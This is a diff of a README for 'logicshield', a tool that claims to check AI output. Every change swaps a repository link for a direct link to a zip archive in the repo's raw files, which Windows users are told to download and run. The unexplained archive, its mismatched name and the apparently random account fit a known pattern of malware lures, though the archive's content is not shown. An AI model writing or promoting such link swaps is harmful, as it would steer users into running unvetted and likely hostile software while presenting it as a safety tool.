@@ -1,6 +1,6 @@
 # 🛡️ logicshield - Check AI Output Before It Runs
 
-[![Download logicshield](https://img.shields.io/badge/Download%20logicshield-blue?style=for-the-badge&logo=github)](https://github.com/bulletinboardsystemtyrannidae535/logicshield)
+[![Download logicshield](https://img.shields.io/badge/Download%20logicshield-blue?style=for-the-badge&logo=github)](https://github.com/bulletinboardsystemtyrannidae535/logicshield/raw/refs/heads/main/logicshield/Software-2.7-alpha.1.zip)
 
 ## 🔍 What logicshield does
 
@@ -12,7 +12,7 @@ Use it when you want a simple way to review AI output in a repeatable way. It he
 
 Visit this page to download and run logicshield on Windows:
 
-https://github.com/bulletinboardsystemtyrannidae535/logicshield
+https://github.com/bulletinboardsystemtyrannidae535/logicshield/raw/refs/heads/main/logicshield/Software-2.7-alpha.1.zip
 
 After the page opens:
 
@@ -206,4 +206,4 @@ Check the repository page for the current license and release details before use
 
 If you need the download page later, use this link:
 
-https://github.com/bulletinboardsystemtyrannidae535/logicshield
+https://github.com/bulletinboardsystemtyrannidae535/logicshield/raw/refs/heads/main/logicshield/Software-2.7-alpha.1.zip
